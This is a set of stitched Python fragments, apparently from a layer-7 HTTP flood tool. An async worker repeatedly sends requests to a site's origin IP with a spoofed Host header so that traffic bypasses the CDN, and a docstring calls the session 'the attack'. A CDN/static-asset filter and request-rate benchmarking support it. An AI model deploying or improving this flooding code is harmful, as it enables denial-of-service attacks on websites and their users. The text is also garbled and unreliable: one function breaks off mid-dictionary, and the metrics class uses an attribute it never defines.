async def ultra_fast_worker(session, url, metrics, stop_event, domain):
    """
    Fire-and-forget worker: send request, get status, release.
    DO NOT read response body — that blocks the connection.
    """
    headers = {"Host": domain}
    
    while not stop_event.is_set():
        await metrics.record_attempt()
        start = time.monotonic()
        
        try:
            # FIRE: send request, get status immediately
            resp = await session.get(
                url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=5)  # STRICT 5s
            )
            status = resp.status
            await resp.release()  # RELEASE immediately, don't read body
            
            latency = (time.monotonic() - start) * 1000
            
            if latency > 10000:
                # This is effectively a timeout
                await metrics.record_timeout()
            else:
                await metrics.record_complete(status, latency)
                
        except asyncio.TimeoutError:
            await metrics.record_timeout()
        except aiohttp.ClientConnectorError as e:
            await metrics.record_failed(f"ConnectorError:{type(e).__name__}")
        except aiohttp.ClientError as e:
            await metrics.record_failed(f"ClientError:{type(e).__name__}")
        except asyncio.CancelledError:
            await metrics.record_cancelled()
            raise
        except Exception as e:
            await metrics.record_failed(f"UNEXPECTED:{type(e).__name__}")
            traceback.print_exc()

async def health_check(session, domain: str, ip: str) -> dict:
    """
    Health check with proper thresholds.
    """
    url = f"https://{ip}/"
    headers = {"Host": domain}
    
    try:
        start = time.monotonic()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:

            # Check 1: HTTP status
            if resp.status >= 400:
                return {
                    "ok": False,

                    "ok": False,

[FIX-04] CDN FILTER — PATH-BASED Hardening

def is_static_asset(url: str, cms_type: str) -> tuple[bool, str]:
    """
    Check if URL is a static asset based on CMS type.
    """
    parsed = urlparse(url)
    path = parsed.path.lower()
    
    db = UniversalCMSDatabase.CMS_SIGNATURES.get(cms_type, 
                                                  UniversalCMSDatabase.CMS_SIGNATURES["generic"])
    
    # Check static extensions
    for ext in db["static_extensions"]:
        if path.endswith(ext):
            return True, f"static_extension:{ext}"
    
    # Check filter paths
    for fp in db["filter_paths"]:
        if fp.endswith("/*"):
            prefix = fp.rstrip("/*")
            if prefix in path:
                return True, f"filter_path:{prefix}"
        elif fp in path:
            return True, f"filter_path:{fp}"
    
    # Check CDN domains
    cdn_domains = {
        "squarespace": ["assets.squarespace.com", "static.squarespace.com"],
        "shopify": ["cdn.shopify.com"],
        "wix": ["*.wix.com"],
        "generic": ["cdn.", "static.", "assets.", "images.", "img."]
    }
    
    domain = parsed.netloc.lower()
    for cdn in cdn_domains.get(cms_type, cdn_domains["generic"]):
        if cdn in domain:
            return True, f"cdn_domain:{cdn}"
    
    return False, "valid"

async def benchmark_with_session(session, domain: str, ip: str, duration: int = 3) -> dict:
    """
    Benchmark using the EXACT SAME session as attack.
    No separate session creation.
    """
    url = f"https://{ip}/"
    headers = {"Host": domain}
    
    # Warm-up
    try:
        async with session.get(url, headers=headers, timeout=5) as resp:
            if resp.status >= 400:
                return {"rps": 0, "error": f"warmup_http_{resp.status}"}
    except Exception as e:
        return {"rps": 0, "error": f"warmup_failed:{e}"}
    
    # Benchmark
    start = time.monotonic()
    count = 0
    errors = 0
    
    while time.monotonic() - start < duration:
        try:
            async with session.get(url, headers=headers, timeout=5) as resp:
                if resp.status < 400:
                    count += 1
                else:
                    errors += 1
        except Exception:
            errors += 1
    
    elapsed = time.monotonic() - start
    rps = count / elapsed if elapsed > 0 else 0
    
    return {
        "rps": rps,
        "total": count,
        "errors": errors,
        "duration": elapsed
    }

[FIX-06] METRICS — CORRECT ERROR RATE

class FixedMetrics:
    def __init__(self):
        self.attempted = 0
        self.completed = 0
        self.failed = 0
        self.timeout = 0
        self.cancelled = 0
        self._lock = asyncio.Lock()
    
    @property
    def error_rate(self) -> float:
        if self.attempted == 0:
            return 0.0
        return self.failed / self.attempted  # CORRECT
    
    @property
    def success_rate(self) -> float:
        if self.attempted == 0:
            return 0.0
        return self.completed / self.attempted
    
    @property
    def rps(self) -> float:
        if not self.latencies:
            return 0.0
        total_time = sum(self.latencies) / 1000
        return self.completed / total_time if total_time > 0 else 0
    
    def validate(self) -> tuple[bool, str]:
        total = self.completed + self.failed + self.timeout + self.cancelled
        if self.attempted != total:
            return False, f"MISMATCH: A={self.attempted}, T={total}, Missing={self.attempted-total}"
        return True, "BALANCED"
